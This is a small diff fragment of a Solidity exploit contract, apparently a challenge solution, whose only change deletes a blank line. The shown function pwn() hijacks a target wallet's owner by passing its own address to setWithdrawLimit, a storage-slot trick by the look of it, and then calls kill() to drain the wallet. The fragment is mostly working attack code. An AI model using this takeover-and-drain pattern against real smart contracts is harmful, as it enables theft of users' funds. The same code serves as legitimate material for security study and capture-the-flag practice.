@@ -62,7 +62,6 @@ contract BurnerWalletExploit {
     function pwn() external {
         // set owner to this contract
         IBurnerWallet(target).setWithdrawLimit(uint256(uint160(address(this))));
-
         // kill to drain wallet
         IBurnerWallet(target).kill();
     }
